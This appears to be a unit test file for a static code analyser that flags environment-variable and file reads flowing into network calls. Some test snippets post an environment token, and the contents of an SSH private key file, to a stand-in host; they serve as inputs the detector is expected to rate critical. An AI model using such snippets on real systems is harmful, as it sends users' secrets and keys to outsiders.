"""Unit tests for the AST rules and the data-flow pass."""

from __future__ import annotations

from backend.core import static_analysis
from backend.core.dataflow import scan_flows
from backend.rules import python_rules


def _analyse(source: str):
    context = static_analysis.AnalysisContext(
        path="snippet.py", source=source, lines=source.splitlines()
    )
    tree, _ = static_analysis.parse_source("snippet.py", source)
    assert tree is not None
    capabilities = static_analysis.scan_capabilities(context, tree)
    flows = scan_flows(context, tree)
    return context, capabilities, flows


def test_env_read_alone_is_low_severity():
    _, capabilities, flows = _analyse("import os\nkey = os.environ['API_KEY']\n")
    rules = {c["rule_id"] for c in capabilities}
    assert "PY_ENV_ACCESS" in rules
    assert flows == []
    assert python_rules.get("PY_ENV_ACCESS").severity == "low"


def test_network_call_alone_is_low_severity():
    _, capabilities, flows = _analyse("import requests\nrequests.get('https://example.com')\n")
    rules = {c["rule_id"] for c in capabilities}
    assert "PY_NETWORK_EGRESS" in rules
    assert flows == []
    assert python_rules.get("PY_NETWORK_EGRESS").severity == "low"


def test_env_to_network_direct_argument_is_critical():
    _, _, flows = _analyse(
        "import os, requests\n"
        "requests.post('https://x.tld', data=os.environ.get('TOKEN'))\n"
    )
    assert [f["rule_id"] for f in flows] == ["DF_ENV_TO_NETWORK"]
    assert python_rules.get("DF_ENV_TO_NETWORK").severity == "critical"


def test_env_to_network_through_variables_and_dict():
    _, _, flows = _analyse(
        "import os, requests\n"
        "token = os.getenv('TOKEN')\n"
        "body = {'t': token}\n"
        "requests.post('https://x.tld', json=body)\n"
    )
    assert [f["rule_id"] for f in flows] == ["DF_ENV_TO_NETWORK"]


def test_file_to_network_is_critical():
    _, _, flows = _analyse(
        "import requests\n"
        "content = open('/home/u/.ssh/id_rsa').read()\n"
        "requests.post('https://x.tld', data=content)\n"
    )
    assert [f["rule_id"] for f in flows] == ["DF_FILE_TO_NETWORK"]


def test_untainted_network_call_produces_no_flow():
    _, _, flows = _analyse(
        "import requests\n"
        "def ping():\n"
        "    url = 'https://example.com/health'\n"
        "    return requests.get(url, timeout=3)\n"
    )
    assert flows == []


def test_subprocess_and_dynamic_exec_are_detected():
    _, capabilities, _ = _analyse("import subprocess\nsubprocess.run(['ls'], shell=False)\nexec('x=1')\n")
    rules = {c["rule_id"] for c in capabilities}
    assert "PY_SUBPROCESS" in rules
    assert "PY_DYNAMIC_EXEC" in rules


def test_syntax_error_does_not_raise():
    tree, lines = static_analysis.parse_source("bad.py", "def broken(:\n")
    assert tree is None
    assert lines == ["def broken(:"]
